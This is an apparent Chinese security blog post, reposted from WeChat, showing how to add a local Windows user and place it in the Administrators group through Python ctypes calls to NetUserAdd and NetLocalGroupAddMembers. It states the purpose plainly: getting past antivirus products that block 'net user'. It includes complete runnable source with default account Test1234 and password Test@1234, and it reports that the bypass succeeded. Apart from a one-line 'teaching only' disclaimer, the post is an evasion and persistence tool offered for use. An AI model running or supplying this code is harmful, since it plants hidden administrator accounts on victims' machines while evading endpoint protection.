> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5Iitrfst3TXd8sRCfq6sHw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSNA5s66pv8dxcXbUJcX3aVdsQjRqItbeYWCRsGeIIbDr1G32ZshMP1M1EFj8WrjnbZsCaF3a1ibGyQ/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

API 添加用户  

当我们想在**主机添加一个用户**时，常用的就是桌面操作或命令行通过 net 添加  

这不 net 命令添加用户被 360、火绒等干的死死的，只能绕过了

网上也有很多方法可以绕过进行添加用户，但有一种是通过两个 api 函数进行添加用户，添加到用户组，比较好玩。

这有个 c 项目 https://github.com/newsoft/adduser

不过没查到 py 的源码，今就用 py 进行操作一下，看看能行不

添加用户

**NetUserAdd**  

该函数在 Netapi32.dll 库中，可以添加一个用户帐户，并指定密码和权限级别。

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd
```

```
NET_API_STATUS NET_API_FUNCTION NetUserAdd(
  LPCWSTR servername,
  DWORD   level,
  LPBYTE  buf,
  LPDWORD parm_err
);
```

servername 参数指定执行函数的远程服务器的 DNS 或 NetBIOS 名称。如果此参数为 NULL，则使用本地计算机。

level 参数指定数据的信息级别，共 1234 级别，每个级别对应不同的数据结构。我们使用 1 级别对应 USERINFO1 数据结构

buf 则是传入 USERINFO1 数据结构，里面包含用户名、密码等

parm_err 参数为 NULL，则不会在出错时返回索引

```
ctypes.windll.Netapi32.NetUserAdd(None,1,USER_INFO_1,None)
```

调用成功返回 0，失败返回其他数据  

**USERINFO1 结构**

该 USERINFO1 结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。

数据结构原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-userinfo1
```

```
typedef struct _USER_INFO_1 {
  LPWSTR usri1_name;
  LPWSTR usri1_password;
  DWORD  usri1_password_age;
  DWORD  usri1_priv;
  LPWSTR usri1_home_dir;
  LPWSTR usri1_comment;
  DWORD  usri1_flags;
  LPWSTR usri1_script_path;
} USER_INFO_1, *PUSER_INFO_1, *LPUSER_INFO_1;
```

但这是 C 所使用的数据结构，我们需要用 ctypes 库来构造 py 能用的数据结构

```
class USER_INFO_1(ctypes.Structure):
    _fields_ = [
        ('usri1_name',wintypes.LPWSTR),
        ('usri1_password',wintypes.LPWSTR),
        ('usri1_password_age',wintypes.DWORD),
        ('usri1_priv',wintypes.DWORD),
        ('usri1_home_dir',wintypes.LPWSTR),
        ('usri1_comment',wintypes.LPWSTR),
        ('usri1_flags',wintypes.DWORD),
        ('usri1_script_path',wintypes.LPWSTR)
    ]
```

然后使用该数据结构构造一个对象，并传入相应的参数  

```
ui = USER_INFO_1()

ui.usri1_name =username
ui.usri1_password =password
ui.usri1_priv = USER_PRIV_USER
ui.usri1_home_dir = None
ui.usri1_comment = None
ui.usri1_flags = (UF_SCRIPT | UF_NORMAL_ACCOUNT)
ui.usri1_script_path = None
```

NetUserAdd 函数直接传入该数据结构即可  

```
a = ctypes.windll.Netapi32.NetUserAdd(None,1,ui,None)
if a == 0:
    print("add user success : name={} passwd={}".format(username,password))
else:
    print("add user error")
```

添加用户到组

**NetLocalGroupAddMembers**  

该函数在 Netapi32.dll 库中，可以添加用户到指定的组

函数原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers
```

```
NET_API_STATUS NET_API_FUNCTION NetLocalGroupAddMembers(
  LPCWSTR servername,
  LPCWSTR groupname,
  DWORD   level,
  LPBYTE  buf,
  DWORD   totalentries
);
```

servername 参数指定主机名。参数为 NULL 使用本地计算机。  

groupname 参数指定组名

level 参数共 0 和 3 级别，我们使用 3 级别对应 LOCALGROUPMEMBERSINFO_3 数据结构

buf 则是传入 LOCALGROUPMEMBERSINFO_3 数据结构，里面包含需要操作的用户名

totalentries 参数指从数据结构中操作几个用户

```
ctypes.windll.Netapi32.NetLocalGroupAddMembers(None,groupname,3，LOCALGROUP_MEMBERS_INFO_3,1)
```

调用成功返回 0，失败返回其他数据  

**LOCALGROUPMEMBERSINFO_3 结构**

该 LOCALGROUPMEMBERSINFO_3 结构 包含与本地组成员相关联的帐户名和域名

数据结构原型：

```
https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-localgroupmembersinfo_3
```

```
typedef struct _LOCALGROUP_MEMBERS_INFO_3 {
  LPWSTR lgrmi3_domainandname;
} LOCALGROUP_MEMBERS_INFO_3, *PLOCALGROUP_MEMBERS_INFO_3, *LPLOCALGROUP_MEMBERS_INFO_3;
```

但这是 C 所使用的数据结构，我们需要用 ctypes 库来构造 py 能用的数据结构  

```
class _LOCALGROUP_MEMBERS_INFO_3(ctypes.Structure):
    _fields_ = [
        ('lgrmi3_domainandname', wintypes.LPWSTR)
    ]
```

然后使用该数据结构构造一个对象，并传入相应的参数  

```
name = _LOCALGROUP_MEMBERS_INFO_3()
name.lgrmi3_domainandname = username
```

NetLocalGroupAddMembers 函数直接操作即可  

```
LPBYTE = POINTER(c_byte)
ctypes.windll.Netapi32.NetLocalGroupAddMembers.argtypes = (wintypes.LPCWSTR,wintypes.LPCWSTR,wintypes.DWORD,LPBYTE,wintypes.DWORD)
b = ctypes.windll.Netapi32.NetLocalGroupAddMembers(None, groupname, 3, LPBYTE(name), 1)
if b == 0:
   print("add group success : name={} group={}".format(username, groupname))
else:
   print("add group error")
```

测试

环境使用的 py2.7，测试火绒和 360  

默认添加 Test1234，密码 Test@1234，组 Administrators

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSNA5s66pv8dxcXbUJcX3aVd4IaFfBPCWIqBf64aRasYGFxqez2j9s5QXZcljr5MGVDulQdW4AIU3g/640?wx_fmt=png)

**成功绕过，无拦截**  

源码：

```
# XG小刚
import ctypes
from ctypes import wintypes
from ctypes import *
import sys

USER_PRIV_GUEST = 0
USER_PRIV_USER = 1
USER_PRIV_ADMIN = 2
UF_SCRIPT = 1
UF_NORMAL_ACCOUNT = 512

LPBYTE = POINTER(c_byte)

class USER_INFO_1(ctypes.Structure):
    _fields_ = [
        ('usri1_name',wintypes.LPWSTR),
        ('usri1_password',wintypes.LPWSTR),
        ('usri1_password_age',wintypes.DWORD),
        ('usri1_priv',wintypes.DWORD),
        ('usri1_home_dir',wintypes.LPWSTR),
        ('usri1_comment',wintypes.LPWSTR),
        ('usri1_flags',wintypes.DWORD),
        ('usri1_script_path',wintypes.LPWSTR)
    ]

class _LOCALGROUP_MEMBERS_INFO_3(ctypes.Structure):
    _fields_ = [
        ('lgrmi3_domainandname', wintypes.LPWSTR)
    ]

def adduser(username = 'Test1234',password = 'Test@1234'):
    ui = USER_INFO_1()
    ui.usri1_name =username
    ui.usri1_password =password
    ui.usri1_priv = USER_PRIV_USER
    ui.usri1_home_dir = None
    ui.usri1_comment = None
    ui.usri1_flags = UF_SCRIPT
    ui.usri1_script_path = None

    a = ctypes.windll.Netapi32.NetUserAdd(None,1,ui,None)
    if a == 0:
        print("add user success : name={} passwd={}".format(username,password))
    else:
        print("add user error")

def addgroup(username ='Test1234' ,groupname = 'Administrators'):
    name = _LOCALGROUP_MEMBERS_INFO_3()
    name.lgrmi3_domainandname = username

    ctypes.windll.Netapi32.NetLocalGroupAddMembers.argtypes = (wintypes.LPCWSTR,wintypes.LPCWSTR,wintypes.DWORD,LPBYTE,wintypes.DWORD)
    b = ctypes.windll.Netapi32.NetLocalGroupAddMembers(None, groupname, 3, LPBYTE(name), 1)
    if b == 0:
        print("add group success : name={} group={}".format(username, groupname))
    else:
        print("add group error")

def main():
    if len(sys.argv) == 1:
        adduser()
        addgroup()
    elif len(sys.argv) == 3:
        adduser(str(sys.argv[1]),str(sys.argv[2]))
        addgroup(str(sys.argv[1]))
    elif len(sys.argv) == 4:
        adduser(str(sys.argv[1]), str(sys.argv[2]))
        addgroup(str(sys.argv[1]),str(sys.argv[3]))
    else:
        print("usage: {} username password".format(sys.argv[1]))
        print("usage: {} username password groupname".format(sys.argv[1]))

if __name__ == '__main__':
    main()
```

公众号